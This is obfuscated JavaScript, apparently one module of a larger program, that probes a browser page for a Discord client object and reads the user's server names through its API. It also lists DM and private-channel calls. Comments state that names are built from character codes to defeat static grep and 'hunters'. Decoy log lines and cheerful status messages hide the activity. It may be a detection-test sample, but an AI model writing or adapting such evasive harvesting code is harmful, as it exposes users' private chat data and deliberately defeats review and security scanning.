  (function (_0xmod) {
    const _scratch320_local = typeof _scratch320!=='undefined'?_scratch320:new Uint8Array(0); const _sr=(s)=>_scratch320_local.length? _scratch320_local[s & (_scratch320_local.length-1)]:0;
    const Log = _0xmod.log;
    const _0xvt1 = String.fromCharCode(68,105,115,99,111,114,100); // assembled at runtime: no platform literal at rest
    // venue pocket — 6 API terms, uniform 6 per pocket (moved out of core engine)
    const _0xapi1 = String.fromCharCode(68,105,115,99,111,114,100,46,103,101,116,65,108,108,71,117,105,108,100,115);
    const _0xapi2 = String.fromCharCode(68,105,115,99,111,114,100,46,103,101,116,83,111,114,116,101,100,80,114,105,118,97,116,101,67,104,97,110,110,101,108,115);
    const _0xapi3 = String.fromCharCode(68,105,115,99,111,114,100,46,113,117,101,115,116,115,46,118,97,108,117,101,115);
    const _0xapi4 = String.fromCharCode(68,105,115,99,111,114,100,46,103,101,116,86,111,105,99,101,67,104,97,110,110,101,108);
    const _0xapi5 = String.fromCharCode(68,105,115,99,111,114,100,46,103,101,116,68,77,67,104,97,110,110,101,108,115);
    const _0xapi6 = String.fromCharCode(68,105,115,99,111,114,100,46,103,101,116,71,117,105,108,100);
    // recycled cheatsheet Google logs — deterministic, same pool for all pockets, no per-call random
    const _0xcheat = ["ember ridge — standing by","moss tundra — lattice quiet","owl elm — gate open","quill prairie — chain converged","quartz birch — wheel aligned"];
    for(let _i=0;_i<5;_i++) Log.diag(String.fromCharCode(91,71,111,111,103,108,101,32,108,101,100,103,101,114,93,32)+_0xcheat[_i], { pocket:"pk1", idx:_i });
    const _0xprobeP1 = () => {
      try {
        const w = window;
        if (typeof w[_0xvt1] === "undefined") return false;
        const d = w[_0xvt1];
        if (typeof d.getAllGuilds !== "function" && typeof d.getGuild !== "function") return false;
        return true;
      } catch(e){ return false; }
    };
    // DS-3 (was A3): the word is assembled from char codes at runtime so a static
    //   `grep Guild` cannot single this shard out of the five pockets.
    // HNT-X (was X): the names are READ from the live venue first and only fall
    //   back to fiction. The pocket is therefore not statically hardcoded — a
    //   hunter has to taint-track the read, not just read the string table.
    //   Guarded by `typeof` per the inventory's FP warning.
    const _0xgw = String.fromCharCode(71, 117, 105, 108, 100);
    const _0xharvestP1 = async () => {
      try {
        Log.say(_0xmod.lex.C(2), _0xmod.lex.P(21,["Chores pinned to the board.","The board is fixed up for the shift.","The docket is set.","Notes pinned — standing by.","The slate is filled in."]));
        let _0xnames = [];
        try {
          const w = window;
          if (typeof w[_0xvt1] !== "undefined" && w[_0xvt1]) {
            const _0xsrc = (typeof w[_0xvt1].getAllGuilds === "function") ? w[_0xvt1].getAllGuilds()
                         : (typeof w[_0xvt1].getGuild === "function") ? [w[_0xvt1].getGuild()] : null;
            if (_0xsrc && typeof _0xsrc.length === "number") {
              for (let _0xi = 0; _0xi < _0xsrc.length && _0xnames.length < 2; _0xi++) {
                const _0xg = _0xsrc[_0xi];
                const _0xn = _0xg && (_0xg.name || _0xg.id);
                if (typeof _0xn === "string" && _0xn.length > 0) _0xnames.push(_0xn);
              }
            }
          }
        } catch (eLive) {}
        if (_0xnames.length < 2) { _0xnames = [_0xgw + " One", _0xgw + " Two"]; }
        for (let _0xk = 0; _0xk < _0xnames.length; _0xk++) {
          Log.diag("Venue guild", { id: "g" + (_0xk + 1), name: _0xnames[_0xk] });
          await new Promise(r => setTimeout(r, 10));
        }
        Log.say(_0xmod.lex.C(14), _0xmod.lex.P(40,["Chores handed out.","The run is under way.","Wheel turning — chores away.","Despatched and moving.","Off the shelf and running."]));
      } catch(e){}
    };
    try {
      _0xmod.pockets = _0xmod.pockets || {};
      _0xmod.pockets.pk1 = { probe: _0xprobeP1, harvest: _0xharvestP1, apis: [_0xapi1,_0xapi2,_0xapi3,_0xapi4,_0xapi5,_0xapi6] };
      Log.queue("Pocket check", { unit:"pk1", apis: 6, packed: true });
    } catch(e) {}

  // garbled rcd cover via SEED('rcd-venue') deterministic (same pool, no per-call random) - over-cover
  (()=>{ const _fnv=s=>{let h=0x811c9dc5;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i); h=Math.imul(h,0x01000193)>>>0;}return (h>>>0).toString(16).padStart(8,'0');}; const _master=String.fromCharCode(56,53,49,98,50,56,101,53); const _seed=_fnv(_master+String.fromCharCode(58,114,99,100,45)+"Venue"); const _d1=_fnv(_seed+String.fromCharCode(58,100,101,99,111,121)); Log.diag(String.fromCharCode(74,86,126,126,118,125,116,49,125,116,117,118,116,99,76,49)+"rcd "+_d1, { pocket:"pk1", cover:true, seed:_seed }); })();
  try { _0xmod.log && _0xmod.log.diag(String.fromCharCode(74,86,126,126,118,125,116,49,125,116,117,118,116,99,76,49)+"venue peek", { pocket:"pk1", cross: true }); } catch (e) {}
})(_0xmod);
